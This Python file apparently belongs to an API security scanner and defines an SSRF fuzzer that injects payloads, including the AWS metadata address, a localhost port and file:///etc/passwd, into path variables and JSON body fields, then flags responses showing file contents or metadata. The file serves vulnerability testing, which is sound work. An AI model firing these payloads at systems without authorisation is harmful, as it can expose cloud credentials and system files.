import logging
import asyncio
from typing import Dict, Any, List

logger = logging.getLogger(__name__)

class SsrfFuzzer:
    SSRF_PAYLOADS = [
        "http://127.0.0.1:9090",           # DVWS local admin network check
        "http://169.254.169.254/latest/meta-data/", # AWS Metadata endpoint
        "file:///etc/passwd"               # Local file inclusion via URL scheme
    ]

    @staticmethod
    async def run_ssrf_tests(client, scan_id: int, base_url: str, endpoint: Dict[str, Any], headers: Dict[str, str], repo) -> List[Dict]:
        vulns = []
        method = endpoint["method"]
        path = endpoint["path"]
        
        # We replace any path variables with the payload, and also send in body if POST/PUT
        if "{" in path:
            for payload in SsrfFuzzer.SSRF_PAYLOADS:
                import re
                injected_path = re.sub(r'\{.*?\}', payload, path)
                if injected_path != path:
                    try:
                        resp = await client.request(method, f"{base_url}{injected_path}", headers=headers)
                        
                        # Detect SSRF success
                        if "root:x:0:0" in resp.text:
                             logger.info(f"Scan {scan_id}: CRITICAL LFI/SSRF FOUND at {method} {injected_path} via file://")
                             vuln_data = {
                                "vuln_type": "Server-Side Request Forgery (SSRF) - Local File Read",
                                "endpoint": f"{method} {path}",
                                "description": f"The endpoint fetched and returned local file contents using the payload: {payload}",
                                "severity": "Critical",
                                "evidence": f"Returned system user data: {resp.text[:100]}..."
                             }
                             repo.add_vulnerability(scan_id, vuln_data)
                             vulns.append(vuln_data)
                             break
                             
                        # Detect if AWS Metadata or local port 9090 proxy succeeded
                        # A bit heuristic: if it returns 200 and it's not the usual API shape
                        # Or if we see proxy errors
                        if "Connection refused" in resp.text or "ami-id" in resp.text:
                             logger.info(f"Scan {scan_id}: SSRF Network Interaction FOUND at {method} {injected_path}")
                             vuln_data = {
                                "vuln_type": "Server-Side Request Forgery (SSRF) - Internal Network Access",
                                "endpoint": f"{method} {path}",
                                "description": f"The endpoint attempted an outbound network connection to an internal service or cloud metadata IP using the payload: {payload}",
                                "severity": "High",
                                "evidence": f"Response contained internal network errors or metadata tags: {resp.text[:100]}..."
                             }
                             repo.add_vulnerability(scan_id, vuln_data)
                             vulns.append(vuln_data)
                             break
                    except Exception as e:
                        pass
        
        # Body injection
        if method in ["POST", "PUT", "PATCH"]:
            for payload in SsrfFuzzer.SSRF_PAYLOADS:
                json_body = {
                    "url": payload,
                    "website": payload,
                    "avatar": payload,
                    "callback": payload
                }
                
                try:
                    resp = await client.request(method, f"{base_url}{path}", headers=headers, json=json_body)
                    if "root:x:0:0" in resp.text:
                             logger.info(f"Scan {scan_id}: CRITICAL LFI/SSRF FOUND at {method} {path} via JSON body")
                             vuln_data = {
                                "vuln_type": "Server-Side Request Forgery (SSRF) - Local File Read",
                                "endpoint": f"{method} {path}",
                                "description": f"The endpoint fetched and returned local file contents using the JSON body payload '{payload}'",
                                "severity": "Critical",
                                "evidence": f"Returned system user data: {resp.text[:100]}..."
                             }
                             repo.add_vulnerability(scan_id, vuln_data)
                             vulns.append(vuln_data)
                             break
                             
                    if "Connection refused" in resp.text or "ami-id" in resp.text:
                             logger.info(f"Scan {scan_id}: SSRF Network Interaction FOUND at {method} {path} via JSON body")
                             vuln_data = {
                                "vuln_type": "Server-Side Request Forgery (SSRF) - Internal Network Access",
                                "endpoint": f"{method} {path}",
                                "description": f"The API fetched data from an internal network IP via the JSON body payload '{payload}'",
                                "severity": "High",
                                "evidence": f"Response contained expected internal data/errors: {resp.text[:100]}..."
                             }
                             repo.add_vulnerability(scan_id, vuln_data)
                             vulns.append(vuln_data)
                             break
                except Exception:
                    pass

        return vulns
